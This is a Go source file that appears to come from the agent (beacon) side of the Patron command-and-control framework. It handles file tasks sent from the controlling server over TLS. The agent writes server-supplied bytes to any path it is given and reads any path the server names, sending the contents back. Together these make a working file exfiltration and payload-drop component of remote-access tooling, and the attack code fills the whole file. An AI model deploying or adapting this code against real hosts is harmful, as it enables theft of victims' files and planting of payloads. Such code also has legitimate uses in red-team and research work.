package client_utils

import (
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"os"
	"path/filepath"

	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
)

func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Sending file request")

	for {
		if err := SendRequest(encoder, types.FileRequestType, types.FileRequest{AgentID: agentID}); err != nil {
			return err
		}
		var response types.Response
		var success = "Error"
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding file response: %v", err)
		}
		if response.Type == types.FileResponseType {
			if fileResponse, ok := response.Payload.(types.FileResponse); ok {
				logger.Logf(logger.Info, "Recieved File Response Type: FileID: %v AgentID: %v Type: %v", fileResponse.FileID, fileResponse.AgentID, fileResponse.Type)
				if fileResponse.Type == "Download" {
					logger.Logf(logger.Info, "Downloading file to %v", fileResponse.Path)
					err := downloadHandler(fileResponse)
					if err != nil {
						return fmt.Errorf("Failed to download file")
					}
					success = "Success"
					err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
					if err != nil {
						logger.Logf(logger.Error, "Error sending file transfer success: %v", err)
					}

				} else if fileResponse.Type == "Upload" {
					logger.Logf(logger.Info, "Uploading %v to server", fileResponse.Path)
					err := uploadHandler(fileResponse, encoder, decoder)
					if err != nil {
						logger.Logf(logger.Error, "Error sending file: %v", err)
					}
				} else {
					logger.Logf(logger.Info, "No more files to process")
					goto Exit
				}	
			} else {
				return fmt.Errorf("unexpected payload type for FileResponse")
			}			
		} else {
			return fmt.Errorf("unexpected response type: %v, expected FileResponseType", response.Type)
		}
	}
Exit:
	return nil
}

func downloadHandler(fileData types.FileResponse) error {
	dir := filepath.Dir(fileData.Path)
	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
		return fmt.Errorf("failed to create directory %s: %v", dir, err)
	}

	file, err := os.Create(fileData.Path)
	if err != nil {
		return fmt.Errorf("failed to create file %s: %v", fileData.Path, err)
	}
	defer file.Close()

	_, err = file.Write(fileData.Chunk)
	if err != nil {
		return fmt.Errorf("failed to write data to file %s: %v", fileData.Path, err)
	}
	logger.Logf(logger.Info, "Successfully downloaded file to %s", fileData.Path)
	return nil
}

func uploadHandler(fileResponse types.FileResponse, encoder *gob.Encoder, decoder *gob.Decoder) error {
	filePath := fileResponse.Path
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file for upload: %v", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("failed to get file info: %v", err)
	}

	fileSize := fileInfo.Size()
	chunk := make([]byte, fileSize)
	_, err = file.Read(chunk)
	if err != nil {
		return fmt.Errorf("failed to read file contents: %v", err)
	}

	fileReq := createFileToServerRequest(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, "Success", chunk)

	if err := SendRequest(encoder, types.FileToServerType, fileReq); err != nil {
		return fmt.Errorf("error sending file to server: %v", err)
	}

	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return fmt.Errorf("error decoding file transfer status response: %v", err)
	}

	if response.Type == types.FileTransferStatusResponseType {
		if configResponse, ok := response.Payload.(types.FileTransferStatusResponse); ok {
			logger.Logf(logger.Info, "Completed a file transfer: %v", configResponse)
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func createFileToServerRequest(fileID string, agentID string, transferType string, status string, chunk []byte) types.FileToServer {
	return types.FileToServer{
		FileID:    	fileID,
		AgentID:	agentID,
		Type:		transferType,
		Status:		status,
		Chunk:		chunk,
	}
}


func fileTransferSuccessHandler(fileID string, agentID string, transferType string, success string, encoder *gob.Encoder, decoder *gob.Decoder) error {
	successReq := createSuccessRequest(fileID, agentID, transferType, success)
	if err := SendRequest(encoder, types.FileToServerType, successReq); err != nil {
		return err
	}
	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return err
	}

	if response.Type == types.FileTransferStatusResponseType {
		if configResponse, ok := response.Payload.(types.FileTransferStatusResponse); ok {
			logger.Logf(logger.Info, "Completed a file transfer: %v", configResponse)
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func createSuccessRequest(fileID string, agentID string, transferType string, success string) types.FileToServer {
	return types.FileToServer{
		FileID:    	fileID,
		AgentID:	agentID,
		Type:		transferType,
		Status:		success,
	}
}
